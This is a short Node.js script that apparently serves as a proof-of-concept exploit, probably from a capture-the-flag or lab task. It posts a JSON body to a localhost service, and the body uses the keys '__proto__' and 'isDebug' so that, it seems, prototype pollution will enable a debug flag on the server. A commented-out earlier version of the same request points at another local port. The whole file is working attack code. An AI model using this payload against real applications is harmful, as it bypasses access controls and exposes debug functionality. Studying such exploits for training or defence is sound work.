
// var request = require('request');
data = {
    "detail": "__proto__",
    "menu": "isDebug",
    "name": true,
}
// 
// request.post({
//     uri: 'http://localhost:8080/',
//     form: data,
//     json: true
// }, function (error, response, body) {
//     console.log(body);
// });

var request = require('request');
var options = {
	uri: "http://localhost:49160",
  headers: {
    "Content-type": "application/json",
  },
  json: data
};
request.post(options, function(error, response, body){
	console.log(body)
});
